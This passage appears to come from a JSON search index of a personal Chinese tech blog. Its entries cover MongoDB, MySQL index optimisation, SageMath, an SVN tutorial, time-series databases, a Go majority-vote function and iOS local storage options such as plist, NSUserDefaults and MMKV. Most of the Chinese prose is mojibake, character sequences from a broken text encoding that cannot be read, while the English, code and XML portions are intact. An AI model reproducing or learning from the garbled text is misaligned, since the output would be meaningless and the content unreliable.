çµæ´»ï¼Œæ¯”å¦‚æ”¯æŒåµŒå¥—çš„æ–‡æ¡£ã€æ•°ç»„ã€‚   view viewï¼šåœ¨ MongoDB3.4 ä¹‹åå®ç°äº†ä¸å…³ç³»å‹æ•°æ®åº“åŸºæœ¬ç›¸åŒçš„è§†å›¾åŠŸèƒ½ã€‚å®ƒæ—¢å¯ä»¥æ˜¯è™šæ‹Ÿçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç‰©ç†çš„è§†å›¾ã€‚    å¯¹äºå­—æ®µï¼Œå…³ç³»å‹æ•°æ®åº“ä¸­æœ‰ä¸€äº›ç‰¹æ®Šç±»å‹çš„å­—æ®µï¼Œå®ƒä»¬åœ¨ MongoDB ä¸­çš„æ˜ å°„å…³ç³»å¦‚ä¸‹ï¼š\n   RDBMS å­—æ®µ MongoDB å­—æ®µ     ä¸»é”® _idï¼šMongoDB ç”¨ä¸€ç§ç»Ÿä¸€çš„åˆ†å¸ƒå¼ç®—æ³•æ¥å®ç°è¿™ä¸ªå­—æ®µçš„å”¯ä¸€æ€§ã€‚   å¤–é”® refrenceï¼šä¸åŒçš„æ˜¯ MongoDB å¹¶æ²¡æœ‰å®ç°ä»»ä½•çš„çº¦æŸæ£€æŸ¥åŠŸèƒ½ã€‚   ç´¢å¼• indexï¼šä¸å…³ç³»å‹æ•°æ®åº“ä¸­ç´¢å¼•çš„ä½œç”¨ç›¸åŒã€‚åæ–‡è¯¦ç»†é˜è¿°ã€‚    å¯¹äº SQL ä¸­çš„ä¸€äº›æ“ä½œï¼Œåœ¨ MongoDB çš„ API ä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„æ–¹æ³•å®ç°ï¼š\n   SQL æ“ä½œ MongoDB æ“ä½œ     join $lookupï¼šä¸€ä¸ªèšåˆæ“ä½œç¬¦ï¼Œå¯ä»¥å®ç°ç±»ä¼¼ SQL-Join çš„åŠŸèƒ½   trransaction MongoDB 4.0 å¼€å§‹æ”¯æŒäº‹åŠ¡çš„æ”¯æŒ   group by aggregationï¼šMongoDB é€šè¿‡ aggregation æä¾›çš„äº†å¼ºå¤§çš„èšåˆè®¡ç®—æ¡†æ¶ã€‚    PSï¼šMongoDB ä½¿ç”¨ SQL è¿›è¡ŒæŸ¥è¯¢éœ€è¦å€ŸåŠ©ç¬¬ä¸‰æ–¹å·¥å…·å¦‚ mongoboosterã€studio3tã€‚\næ•°æ®ç±»å‹ä¸ä¸»é”® #  Bson æ•°æ®ç±»å‹ï¼š\n  MongDB çš„æ–‡æ¡£ï¼ˆå³ SQL ä¸­çš„è¡Œï¼‰å¯ä»¥ä½¿ç”¨ Js çš„å¯¹è±¡è¡¨ç¤ºï¼Œä»æ ¼å¼ä¸Šè®²æ˜¯ä¸€ç§åŸºäº Json çš„å« Bsonï¼ˆBinary Jsonï¼‰ çš„æ ¼å¼ã€‚\n  Bson å¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¸€ç§ Json çš„æ‰©å±•ç»“æ„ï¼Œå®ƒæ”¯æŒå‡ºäº† Json æ”¯æŒçš„åŸºæœ¬æ•°æ®ç±»å‹ä¹‹å¤–çš„æ—¥æœŸã€æ­£åˆ™è¡¨è¾¾å¼ç­‰ç±»å‹ã€‚\n  åˆ†å¸ƒå¼ IDï¼š\n åˆ†å¸ƒå¼ ID ç®—æ³•æ˜¯ä¸ºäº†ä¿è¯åˆ†å¸ƒå¼æ•°æ®çš„å”¯ä¸€æ€§è€Œè¯ç”Ÿçš„ä¸€ç§ç®—æ³•ã€‚å…¶ä¸­æœ€æœ‰åçš„æ˜¯ Twitter ç ”å‘çš„ snowflake é›ªèŠ±ç®—æ³•ï¼Œå®ƒåŒæ—¶ä½¿ç”¨â€œæ—¶é—´æˆ³â€ã€â€œæœºå™¨å·â€ã€â€œè¿›ç¨‹å·â€ã€â€œéšæœºæ•°â€æ¥å®ç°å”¯ä¸€æ€§ã€‚ è€Œ MongoDB çš„åˆ†å¸ƒå¼ ID ç®—æ³•åˆ™å°†éšæœºæ•°ä¸€éƒ¨åˆ†æ›¿æ¢ä¸ºäº†åˆå§‹åŒ–éšæœºçš„è‡ªå¢ counterï¼›  ç´¢å¼• #  ç´¢å¼•æ˜¯ä¸€ä¸ªæ•°æ®åº“çš„å…³é”®èƒ½åŠ›ï¼Œå®ƒçš„æŠ€æœ¯å®ç°ä¾èµ–äºåº•å±‚çš„å­˜å‚¨å¼•æ“ï¼ŒMongoDB ä½¿ç”¨ wiredTiger ä½œä¸ºé»˜è®¤çš„å­˜å‚¨å¼•æ“ã€‚\nMongoDB çš„ç´¢å¼•åœ¨å®ç°ä¸Šä½¿ç”¨äº† B+ æ ‘çš„ç»“æ„ï¼Œè¿™ä¸å…¶ä»–çš„ä¼ ç»Ÿæ•°æ®åº“æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚\nè¯„ä¼°ä¸è°ƒä¼˜ï¼š\n ä½¿ç”¨ explain æ–¹æ³•å¯ä»¥ç”¨äºå¯¹æŸ¥è¯¢è®¡åˆ’è¿›è¡Œåˆ†æå¹¶ä¸”è¿›ä¸€æ­¥è¯„ä¼°ç´¢å¼•çš„ç»“æœã€‚è¿›ä¸€æ­¥äº†è§£å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡æ¡£ã€‚  åˆ†å¸ƒå¼é›†ç¾¤ #  åœ¨è®¨è®ºä¸€ä¸ªåˆ†å¸ƒå¼é›†ç¾¤æ—¶ï¼Œé€šå¸¸é€šè¿‡æè¿°ä»¥ä¸‹è¿™äº›æ–¹æ¡ˆçš„å®ç°æ¥è®¨è®ºï¼šâ€œæ•°æ®åˆ†ç‰‡â€ã€â€œæ•°æ®å¤‡ä»½â€ã€â€œæœåŠ¡æ£€æµ‹â€ç­‰ã€‚\næ•°æ®åˆ†ç‰‡ #  å°†é”®ç©ºé—´æ ¹æ®ä¸€å®šçš„ç®—æ³•åˆ†å¸ƒåˆ°ä¸åŒçš„åˆ†å¸ƒå¼èŠ‚ç‚¹ä¸Šå­˜å‚¨çš„æ–¹æ³•ï¼Œç§°ä¸ºæ•°æ®åˆ†ç‰‡ã€‚è€Œ MongoDB æ”¯æŒä¸¤ç§åˆ†ç‰‡æ–¹å¼ï¼š\n â€œèŒƒå›´åˆ†ç‰‡â€ã€â€œå“ˆå¸Œåˆ†ç‰‡â€ã€‚  ç”±äºè€ƒè™‘åˆ°åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ç»å¸¸å‡ºç°çš„å•ç‚¹æ•…éšœæˆ–è€…å‡ºç°æ–°å¢åŠ æœåŠ¡å™¨ï¼Œä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•æ˜¯æ›´åˆç†çš„è§£å†³æ–¹æ¡ˆï¼š\n  ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¸€èˆ¬æ»¡è¶³å››ä¸ªæ¡ä»¶ï¼šâ€œå¹³è¡¡æ€§â€ï¼ˆæ‰€æœ‰æä¾›å¯ç”¨çš„æœåŠ¡ç®¡ç†çš„é”®å€¼ç©ºé—´æ˜¯å¤§è‡´ç›¸ç­‰çš„ï¼‰ã€â€œå•è°ƒæ€§â€ï¼ˆå¦‚æœæœ‰æ–°çš„æœåŠ¡åŠ å…¥ç³»ç»Ÿï¼Œæ‰€æœ‰éœ€è¦å‘ç”Ÿå˜æ›´çš„æ•°æ®éƒ½æ˜¯å˜æ›´åˆ°æ–°çš„ç¼“å†²åŒºï¼‰ã€â€œåˆ†æ•£æ€§â€ã€â€œè´Ÿè½½â€ã€â€œå¹³æ»‘æ€§â€ï¼›\n  åˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•æœ€æ—©åœ¨è®ºæ–‡ã€ŠConsistent Hashing and Random Trees: Distributed Caching Protocols for Relieving Hot Spots on the World Wide Webã€‹ä¸­æå‡ºã€‚\n  ä¸ºäº†ä¿è¯æ•°æ®åœ¨å„ä¸ªæœåŠ¡å™¨ä¸Šå¤æ‚çš„å‡è¡¡æ€§ï¼š\n MongoDB æä¾›äº† â€œå…¨é¢„åˆ†é…â€ã€â€œéé¢„åˆ†é…â€ ä¸¤ç§æ–¹æ¡ˆï¼› å½“ä½¿ç”¨åè€…ç­–ç•¥æ—¶ï¼Œä¸å‡è¡¡çŠ¶æ€ä¼šé€šè¿‡é›†ç¾¤å‡è¡¡å™¨è¿›è¡Œæ£€æµ‹ï¼Œä¸€æ—¦å‘ç°äº†ä¸å‡è¡¡åˆ™ä¼šæ‰§è¡Œæ•°æ®è¿ç§»è¾¾åˆ°å‡è¡¡ï¼› ä¸Šé¢çš„æ•°æ®è¿ç§»ä¼šå¯¹ MongoDB é›†ç¾¤çš„æ€§èƒ½äº§ç”Ÿä¸€å®šçš„å½±å“ï¼Œç›®å‰çš„è§„é¿æ‰‹æ®µåªæ˜¯å°†å‡è¡¡çª—å£å¯¹é½åˆ°é—²æš‡æ—¶æ®µã€‚  æ•°æ®å¤‡ä»½ #  é€šè¿‡ä¸ Redis ç±»ä¼¼çš„ä¸»ä»èŠ‚ç‚¹é›†å®ç°ï¼Œä»èŠ‚ç‚¹ä»ä¸»èŠ‚ç‚¹å¤‡ä»½æ•°æ®ã€‚\nå½“åˆ†å¸ƒå¼ç³»ç»Ÿæ£€æµ‹åˆ°ä¸»èŠ‚ç‚¹å®•æœºæ—¶ï¼Œå°†ä¼šé€šè¿‡ Raft ç®—æ³•é€‰ä¸¾å‡ºä¸€ä¸ªæ–°çš„ä¸»èŠ‚ç‚¹è¿›è¡Œå‡çº§ã€‚\næ•°æ®æ£€æµ‹ #  é€šè¿‡å¿ƒè·³é“¾æ¥æ£€æµ‹åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å•ä¸ªä¸»æœºçš„å­˜æ´»æ€§ã€‚\n"},{"id":171,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/mysql%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","title":"My Sqlæ€§èƒ½ä¼˜åŒ–","section":"æ‚é¡¹åšå®¢","content":"æ€§èƒ½ä¼˜åŒ– #  æŸ¥è¯¢ä¼˜åŒ– #  æŸ¥è¯¢è¯­å¥ä½¿ç”¨åŸåˆ™ï¼š\n  èŒƒå›´æŸ¥è¯¢çš„åˆ—æ”¾åˆ°ç´¢å¼•åˆ—çš„æœ€åé¢ï¼šMySQL ä¼šä¸€ç›´å‘å³åˆ©ç”¨ç´¢å¼•åŒ¹é…ç›´åˆ°é‡åˆ°èŒƒå›´æŸ¥è¯¢ï¼ˆ\u0026gt;ã€\u0026lt;ã€betweenã€likeï¼‰å°±åœæ­¢åŒ¹é…ï¼Œæ‰€ä»¥å¦‚æœå°†èŒƒå›´æ”¾åœ¨å‰é¢ï¼Œåé¢çš„ç´¢å¼•å°†æ— æ³•ä½¿ç”¨ã€‚\nPSï¼šè¿™é‡Œçš„èŒƒå›´æŸ¥è¯¢æ˜¯ä¸åŒ…æ‹¬ in çš„ï¼Œin æ˜¯æŒ‡å¤šä¸ªç­‰å€¼æ¡ä»¶æŸ¥è¯¢ï¼Œä¸å¯¹è”åˆç´¢å¼•çš„åŒ¹é…é€ æˆå½±å“ã€‚ä½†æ˜¯é€šè¿‡ explain åˆ†ææ‰§è¡Œè®¡åˆ’æ—¶æ— æ³•åŒºåˆ«èŒƒå›´æŸ¥è¯¢å’Œå¤šä¸ªç­‰å€¼æŸ¥è¯¢ï¼ˆç»Ÿä¸€æ˜¾ç¤ºä¸º rangeï¼‰\n  = å’Œ in å¯ä»¥ä¹±åºï¼šMySQL çš„æŸ¥è¯¢ä¼˜åŒ–å™¨ä¼šå¸®ä½ ä¼˜åŒ–æˆç´¢å¼•å¯ä»¥è¯†åˆ«çš„å½¢å¼ã€‚æ ¹æ®ç»éªŒæ˜¯å°†ä¸šåŠ¡ä¸­ä½¿ç”¨åˆ°çš„æŸ¥è¯¢é‡Œæœ€å¸¸ç”¨çš„åˆ—æ”¾åœ¨å‰é¢ï¼Œè¿™æ ·å¯ä»¥å°½é‡ä½¿ç”¨åˆ°è¯¥ç´¢å¼•ã€‚\n  å­—ç¬¦ä¸²é€šé…ç¬¦å°½é‡åç½®ï¼šLike æŸ¥è¯¢å¦‚æœä½¿ç”¨ %s% è¿™ç§æ ¼å¼ï¼Œéæœ€å·¦å‰ç¼€åŒ¹é…å°†æ— æ³•ä½¿ç”¨åˆ°ç´¢å¼•ã€‚\n  "},{"id":172,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/sagemath%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/","title":"Sage Mathå¿«é€Ÿä½¿ç”¨æ‰‹å†Œ","section":"æ‚é¡¹åšå®¢","content":"SageMath å¿«é€Ÿä½¿ç”¨æ‰‹å†Œ #  åŸºäº python2 çš„æ•°å­¦æ•™å­¦å·¥å…· sage-mathã€‚\nQuick Manual:\n  æ¯”ç‰¹æµè½¬æ¢ä¸ºæ•´æ•°ï¼š\nZZ([1,1,0,1],base=2) è¿™ç§æ–¹å¼ä¸ int('1101',2) è½¬æ¢çš„ç»“æœç›¸åï¼Œå®ƒç­‰ä»·äº int('1011', 2)\n  æ•´æ•°è½¬åŒ–ä¸ºæ¯”ç‰¹æµï¼š\nInteger(15).binary()   åœ¨ sage ä¸­ï¼Œé€šè¿‡å¤šé¡¹å¼å»ºç«‹ä¸€ä¸ªæœ‰é™åŸŸï¼š\nsage: FF = GF(2**8, name=\u0026#39;x\u0026#39;, modulus=x^8 + x^4 + x^3 + x + 1) åœ¨è¿™ä¸ªæœ‰é™åŸŸä¸­ï¼Œæ•´æ•°ä¸å¤šé¡¹å¼ç›¸äº’è½¬åŒ–ï¼š\n# æ•´æ•°è½¬åŒ–ä¸ºå¤šé¡¹å¼ sage: FF.fetch_int(5) x^2 + 1  # å¤šé¡¹å¼è½¬åŒ–ä¸ºæ•´æ•° sage: FF(x^2 + 1).integer_representation() 5   "},{"id":173,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/svntutorial/","title":"Svn Tutorial","section":"æ‚é¡¹åšå®¢","content":" å­¦ä¹ ç½‘å€ï¼š\n https://www.tutorialspoint.com/svn/svn_environment.htm   SVN #  SVN is a Version Control System.\nLife Cycle #   Create Repository: create operation is used to create a new repository. Checkout: Checkout operation is used to create a working copy from the repository. Update: update operation is used to update working copy. Perform Changes:  Rename operation changes the name of the file/directory. Move operation is used to move files/directories from one place to another in a repository tree.   Review Changes:Status operation lists the modifications that have been made to the working copy. Fix Mistakes: Revert operation reverts the modifications that have been made to the working copy. Resolve Conflicts: Merge operation automatically handles everything that can be done safely. Commit changes: Commit operation is used to apply changes from the working copy to the repository.  Checkout Process #  Subversion provides the checkout command to check out a working copy from a repository. Below command will create a new directory in the current working directory with the name project_repo.\n$ svn checkout http://svn.server.com/svn/project_repo --username=tom After every successful checkout operation, the revision number will get printed. If you want to view more information about the repository, then execute the info command:\n$ pwd /home/tom/project_repo/trunk  $ svn info Perform Changes #  See changes:\n$ svn status ? array.c ? array Add array.c file to the pending change-list.\n$ svn add array.c A array.c Subversion shows A before array.c, it means, the file is successfully added to the pending change-list:\n$ svn status ? array A array.c To store array.c file to the repository, use the commit command with -m option followed by commit message. If you omit -m option Subversion will bring up the text editor where you can type a multi-line message.\n$ svn commit -m \u0026#34;Initial commit\u0026#34; Adding trunk/array.c Transmitting file data . Committed revision 2. "},{"id":174,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/tsdb%E5%AD%A6%E4%B9%A0/","title":"Tsdbå­¦ä¹ ","section":"æ‚é¡¹åšå®¢","content":"TSDB å­¦ä¹  #  æ—¶åºæ•°æ®çš„ç‰¹ç‚¹ï¼š\n æ•°æ®æŒ‰ç…§æ—¶é—´ä¸¥æ ¼å•è°ƒæ’åºï¼› Append Onlyï¼šåªèƒ½å‘åæ’å…¥æ•°æ®ï¼Œä¸èƒ½æ›´æ–°ï¼› å†™æ•°é‡è¿œå¤§äºè¯»æ•°é‡ï¼šå¤§äº 90% çš„æ•°æ®ä»æœªè¢«è¯»å–ï¼› æ•°æ®é‡çº§ç‰¹åˆ«å¤§ï¼Œä½†æ˜¯ç›¸å¯¹æ¯”è¾ƒç¨³å®šï¼› éšç€æ—¶é—´çš„æ¨ç§»ï¼Œæ•°æ®çš„ä»·å€¼å‡å°ï¼Œæœ€è¿‘æ•°æ®çš„ä»·å€¼é«˜äºå†å²æ•°æ®ï¼› é€šå¸¸ä¸ tag èšåˆåœ¨ä¸€èµ·ï¼Œæ ¹æ®æ—¶é—´èŒƒå›´è¿›è¡ŒæŸ¥è¯¢ï¼›  Metrics æ˜¯å­—èŠ‚è·³åŠ¨å®ç° tsdb çš„è§£å†³æ–¹æ¡ˆï¼Œå¾ˆå¤šå¹³å°çš„æ•°æ®æºéƒ½æ¥è‡ª Metricsï¼š\n alarmã€grafanaã€metro-feã€argosï¼›  Metrics ç³»ç»Ÿæ¶æ„åˆ†ä¸ºä¸‰çº§ï¼š\n SDK ä¾§ï¼šé€šè¿‡ SDK å°†æ—¥å¿—ä¿¡æ¯å‘é€åˆ° agentï¼Œagent é€šè¿‡ producer å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼› æ ¸å¿ƒé€»è¾‘ï¼šconsimer/preshuffle ä¸¤ä¸ªæ¶ˆè´¹é€»è¾‘é“¾è·¯ï¼Œåˆ†åˆ«å°†æ•°æ®å­˜å‚¨åˆ°å†·çƒ­å­˜å‚¨çš„ä¸¤ä¸ªä¸åŒæ•°æ®åº“ä¸­ï¼› æ•°æ®å­˜å‚¨ï¼šé€Ÿåº¦å¿«çš„â€œçƒ­å­˜å‚¨â€TSDCã€é€Ÿåº¦è¾ƒæ…¢çš„â€œå†·å­˜å‚¨â€mstoreï¼›  Open Sourceï¼š\n åœ¨ä¸šç•Œæœ‰å¾ˆå¤šå¼€æºçš„è§£å†³æ–¹æ¡ˆï¼šInfluxdbã€Opentsdbã€Druidã€Elasticsearchã€Beringei ç­‰ï¼›  "},{"id":175,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E7%AE%97%E6%B3%95%E5%B0%8F%E8%AE%B0/","title":"ä¸€äº›å¸¸ç”¨çš„ç®—æ³•å°è®°","section":"æ‚é¡¹åšå®¢","content":"ä¸€äº›å¸¸è§çš„ç®—æ³•å°è®° #  Fisherâ€“Yates shuffle æ´—ç‰Œç®—æ³•ï¼šhttps://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle\nBoyer-Moore å¤šæ•°æŠ•ç¥¨ç®—æ³•ï¼šhttps://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_majority_vote_algorithm\nfunc majorityElement(nums []int) int {  iter, most := 0, 0  for _,num := range nums {  if iter == 0 { most, iter = num, iter+1 }  else if most == num { iter += 1 }  else { iter -= 1 }  }  count, sz := 0, len(nums)  for _,num := range nums {  if num == most { count += 1 }  if count * 2 \u0026gt; sz { return most }  }  return -1 } "},{"id":176,"href":"/docs/%E6%9D%82%E9%A1%B9%E5%8D%9A%E5%AE%A2/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/","title":"å®¢æˆ·ç«¯æœ¬åœ°å­˜å‚¨","section":"æ‚é¡¹åšå®¢","content":" åœ¨å®ä¹ è¿‡ç¨‹ä¸­ï¼Œåœ¨å­—èŠ‚è·³åŠ¨å†…éƒ¨åˆ†äº«ä¸Šå­¦ä¹ çš„ä¸œè¥¿\n :floppy_disk:å®¢æˆ·ç«¯æœ¬åœ°å­˜å‚¨ #  ä½œç”¨ #  å®¢æˆ·ç«¯æœ¬åœ°å­˜å‚¨ä¸»è¦æœ‰ä»¥ä¸‹çš„å‡ ä¸ªä½œç”¨ï¼š\n ä½œä¸ºç½‘ç»œ IO çš„ç¼“å­˜ï¼šç¼“å­˜å›¾ç‰‡ã€ç¼“å­˜æ¥å£çš„ Responseï¼› ä¿å­˜é…ç½®æˆ–è€…æ•°æ®ï¼šé…ç½®ä¿¡æ¯ã€çŠ¶æ€ä¿¡æ¯ã€æ—¥å¿—ä¿¡æ¯ã€Crash ä¿¡æ¯ç­‰ï¼› ä½œä¸ºå†…å­˜çš„ Backing Storeï¼šæš‚å­˜å¤§æ–‡ä»¶ã€å¾ç”¨æ‰©å±•å†…å­˜ï¼›  å¸¸è§å­˜å‚¨æ–¹æ¡ˆåˆ†æ #  å¦‚ä½•åˆ†æå„ç§å­˜å‚¨æ–¹æ¡ˆï¼Œä¸»è¦è€ƒè™‘ä»¥ä¸‹å‡ ä¸ªç‰¹æ€§ï¼š\n è¯»å†™æ€§èƒ½ï¼šå¹³å‡è¯»å†™æ€§èƒ½ã€æœ€åè¯»å†™æ€§èƒ½ï¼› å¹¶å‘æ€§èƒ½ï¼šæ˜¯å¦çº¿ç¨‹å®‰å…¨ã€è¯»å†™æ“ä½œäº’ç›¸å¹¶å‘çš„èƒ½åŠ›ï¼› æ•°æ®å®Œæ•´æ€§ï¼šæ•°æ®æŸå¤±æˆ–ä¸¢å¤±çš„æ¦‚ç‡ï¼› ç©ºé—´æ€§èƒ½ï¼šå­˜å‚¨ç›¸åŒçš„æ•°æ®ï¼Œéœ€è¦çš„ç£ç›˜ä¸å†…å­˜ç©ºé—´ï¼›  Plist #  plist æ˜¯ä¸€ç§ xml æ ¼å¼ï¼Œæ˜¯ iOS ä¸­æœ€å¸¸ç”¨çš„é…ç½®å­˜å‚¨æ•°æ®æ ¼å¼ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \t\u0026lt;key\u0026gt;quiz\u0026lt;/key\u0026gt; \t\u0026lt;dict\u0026gt; \t\u0026lt;key\u0026gt;question\u0026lt;/key\u0026gt; \t\u0026lt;array\u0026gt; \t\u0026lt;dict\u0026gt; \t\u0026lt;key\u0026gt;text\u0026lt;/key\u0026gt; \t\u0026lt;string\u0026gt;What does \u0026#39;API\u0026#39; stand for?\u0026lt;/string\u0026gt; \t\u0026lt;key\u0026gt;answer\u0026lt;/key\u0026gt; \t\u0026lt;string\u0026gt;API stands for Application Programming Interface.\u0026lt;/string\u0026gt; \t\u0026lt;/dict\u0026gt; \t\u0026lt;dict\u0026gt; \t\u0026lt;key\u0026gt;text\u0026lt;/key\u0026gt; \t\u0026lt;string\u0026gt;What\u0026#39;s so good about pragmatic REST?\u0026lt;/string\u0026gt; \t\u0026lt;key\u0026gt;answer\u0026lt;/key\u0026gt; \t\u0026lt;string\u0026gt;It\u0026#39;s focused on the api consumer, so it makes it easier for developers to contribute to your app library!\u0026lt;/string\u0026gt; \t\u0026lt;/dict\u0026gt; \t\u0026lt;/array\u0026gt; \t\t\u0026lt;/dict\u0026gt; \u0026lt;/dict\u0026gt;  è¯»å†™æ€§èƒ½éƒ½æ˜¯ O(n)ï¼Œå¿…é¡»å…¨éƒ¨ä»ç£ç›˜ä¸­è¯»å‡ºå†™å…¥ï¼› æ•°æ®å®Œæ•´æ€§ï¼šæ¯æ¬¡éƒ½è¦å…¨é‡è¯»å†™ã€‚æ–­ç”µç­‰ä¸å¯æŠ—åŠ›å‘ç”Ÿæ—¶ï¼Œæ•°æ®æŸå¤±å‘ç”Ÿæ¦‚ç‡æ›´å¤§ï¼› ç£ç›˜ç©ºé—´å¤æ‚åº¦ O(n)ï¼Œå†…å­˜ç©ºé—´å¤æ‚åº¦ 0ï¼› å¹¶å‘æ€§èƒ½éœ€è¦è‡ªå·±å®ç°ï¼›  é€‚ç”¨åœºæ™¯ï¼š\n Plist ä¸é€‚åˆå­˜å‚¨è¿‡å¤šæ•°æ®ï¼Œè¿™æ ·ä¼šé€ æˆæ¯”è¾ƒä¸¥é‡çš„è¯»/å†™å»¶æ—¶ã€‚åŒæ—¶ä¹Ÿä¼šå¢åŠ  Plist æŸåçš„æ¦‚ç‡ï¼Œå¯¼è‡´æ•°æ®ä¸¢å¤±ã€‚ Plist é€‚åˆä¸ç®€å•å°‘é‡é…ç½®å­˜å‚¨çš„åœºæ™¯ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œæ€§èƒ½å¯ä»¥æ¥å—ï¼Œæ“ä½œçš„å®ç°ä¹Ÿè¶³å¤Ÿç®€æ´ã€‚  NSUserDefault #  NSUserDefault æ˜¯å¸¸ç”¨çš„å®¢æˆ·ç«¯ K-V å­˜å‚¨æ–¹æ¡ˆï¼Œå…¶åº•å±‚ä½¿ç”¨ Plist æ–‡ä»¶å­˜å‚¨ï¼Œä¸åŒäºç›´æ¥æ“ä½œ Plist æ–‡ä»¶è¯»å†™æ•°æ®ï¼š\n NSUserDefault å†…éƒ¨è®¾ç½®äº†å†…å­˜ç¼“å­˜ï¼Œå¤§å¤§æå‡äº†è¯»æ€§èƒ½ï¼› é€šè¿‡å¼‚æ­¥è·¨çº¿ç¨‹çš„å»¶æ—¶åŒæ­¥æœºåˆ¶ï¼ŒNSUserDefault ä¼šåœ¨å†™å…¥äº‹ä»¶å‘ç”Ÿåçš„ä¸€æ®µæ—¶é—´æ‰¹é‡çš„å¤„ç†å†™å…¥æ“ä½œï¼Œæå‡å†™å…¥æ€§èƒ½ã€‚  æ€§èƒ½åˆ†æï¼š\n è¯»æ“ä½œä¸€èˆ¬æ˜¯ç›´æ¥è¯»å–å†…å­˜ï¼Œå¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º 0ï¼›æœ€åè¯»æ€§èƒ½å‘ç”Ÿåˆå§‹åŒ–ä¹‹å‰ï¼Œæ—¶é—´å¤æ‚åº¦ O(n)ï¼› å¦‚æœå¹³å‡ x æ¬¡å†™å…¥è¿›è¡Œä¸€æ¬¡å…¨é‡å†™å›ï¼Œå¹³å‡æ—¶é—´å¤æ‚åº¦ O(n/x)ï¼›æœ€åå°±æ˜¯è¿ç»­å…¨é‡å†™å› O(n)ï¼› æ•°æ®å®Œæ•´æ€§ï¼šNSUserDefault çš„å¼‚æ­¥å»¶æ—¶åŒæ­¥æœºåˆ¶å¾ˆæœ‰å¯èƒ½å¯¼è‡´æ•°æ®åœ¨æç«¯æƒ…å†µä¸‹æ— æ³•è§¦å‘ï¼Œä½†æ˜¯ç›¸å¯¹äº Plistï¼Œå…¶æœ‰æ›´å°‘çš„å›å†™æ¬¡æ•°ã€‚æ‰€ä»¥å…¶æ•°æ®æŸåçš„å¯èƒ½æ€§æ¯” Plist å°ï¼Œä½†æ˜¯æ•°æ®ä¸¢å¤±çš„æ¦‚ç‡æ¯” Plist å¤§ã€‚ ç©ºé—´æ€§èƒ½ï¼šé™¤äº†å†…å­˜å¼€é”€ï¼Œä¸ plist ä¸€è‡´ï¼› å¹¶å‘æ€§èƒ½ï¼šNSUserDefault æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œä½†æ˜¯ä¸æ”¯æŒå¹¶å‘ï¼›  NSUserDefault æ˜¯ Plist çš„ä¼˜åŒ–ï¼š\n æœ‰æ›´å¥½çš„è¯»å†™æ€§èƒ½ã€ä»¥åŠæ›´å‹å¥½ç®€å•çš„æ“ä½œæ¥å£ï¼› ä½†æ˜¯å®ƒéœ€è¦é¢å¤–çš„å†…å­˜å¼€é”€ï¼Œè€Œä¸”å†™æ€§èƒ½ä¾ç„¶æ¯”è¾ƒå·®ï¼Œç»å¸¸ä¼šè§¦å‘å…¨é‡å›å†™ï¼Œæ²¡æœ‰è´¨çš„æå‡ï¼Œä¾ç„¶åªæ¨èå­˜å‚¨è¾ƒå°‘çš„æ•°æ®ï¼› å®ƒè§„æ¨¡å¯ä»¥æ¯” Plist å¤§ï¼Œ4M ä»¥å†…æ˜¯æ¯”è¾ƒæ¨èçš„å€¼ï¼ˆè¶…è¿‡4Mï¼ŒConsole ä¼šæœ‰ Warningï¼‰ã€‚ åœ¨æ€§èƒ½æå‡çš„åŒæ—¶ï¼Œä¹Ÿæ›´å®¹æ˜“å¯¼è‡´æ•°æ®ä¸¢å¤±ï¼Œä¸å»ºè®®å­˜å‚¨éå¸¸é‡è¦çš„é…ç½®æ•°æ®  MMKV #  mmap æŠ€æœ¯ #  åœ¨äº†è§£ MMKV æŠ€æœ¯ä¹‹å‰æˆ‘ä»¬éœ€è¦å…ˆäº†è§£ä¸€ä¸‹ mmap æŠ€æœ¯ï¼š\næŠ€æœ¯ç—›ç‚¹ï¼š\n åœ¨ä¼ ç»Ÿè¯»å†™æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦åœ¨å†…å­˜ä¸­è‡ªå·±è®¾ç½® bufferï¼›ä»¥åŠå¤„ç†æ–‡ä»¶ä¸å†…å­˜çš„åŒæ­¥ï¼ˆseekã€writeã€readï¼‰ã€‚è¿™é€šå¸¸æ¯”è¾ƒå¤æ‚ï¼Œæˆ‘ä»¬è¿˜éœ€è¦é€‚å½“çš„ fsync è°ƒç”¨ã€‚  è§£å†³æ–¹æ¡ˆï¼š\n Unix æ“ä½œç³»ç»Ÿæä¾›äº†ä¸€ä¸ªå«åš mmap 